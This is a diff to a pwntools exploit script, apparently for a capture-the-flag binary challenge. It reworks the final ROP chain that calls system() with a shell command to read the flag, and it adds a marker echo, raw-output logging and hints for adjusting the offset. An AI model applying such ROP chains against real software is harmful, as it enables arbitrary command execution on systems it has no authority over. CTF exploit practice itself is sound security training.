@@ -234,7 +234,10 @@ def main():
     put(TAIL,        pop_rdi)
     put(TAIL + 0x08, cmd_addr)
     put(TAIL + 0x10, system)
-    cmd = b"/bin/cat flag.txt\x00"      # absolute path in case PATH is minimal
+    # Self-diagnosing command: echo a marker (proves the ROP fired) then try
+    # several flag locations. system() runs /bin/sh -c "<cmd>".
+    cmd = b"echo ROP_OK; cat flag.txt /script/flag.txt /flag* 2>&1\x00"
+    assert STR_OFF + len(cmd) <= 0xe8, "cmd too long"
     data[STR_OFF:STR_OFF + len(cmd)] = cmd
 
     log.success("sending final ROP chain")
@@ -248,14 +251,21 @@ def main():
         return
     io.send(bytes(data))         # add() prints Success, then returns into the chain
 
-    out = io.recvrepeat(2)
+    out = io.recvrepeat(3)
+    print("----- raw output -----")
+    print(repr(out))
+    print("----------------------")
     print(out.decode("latin-1", "ignore"))
     m = re.search(rb"bcsctf\{[^}]*\}", out)
     if m:
         log.success("FLAG: " + m.group().decode())
+    elif b"ROP_OK" in out:
+        log.warning("ROP fired (saw ROP_OK) but no flag printed -> file/cwd/perms; "
+                    "the raw output above shows any cat error")
+        io.interactive()
     else:
-        log.warning(f"reached the read at OFF={hex(OFF)} but no flag -> chain landed "
-                    f"slightly off; nudge OFF by +/-0x10 or send me this run's output")
+        log.warning(f"no ROP_OK -> chain not executing at OFF={hex(OFF)}. "
+                    f"Send me the raw output above; also try OFF=0x38 / 0x20 / 0x30 / 0x18.")
         io.interactive()
 
 if __name__ == "__main__":
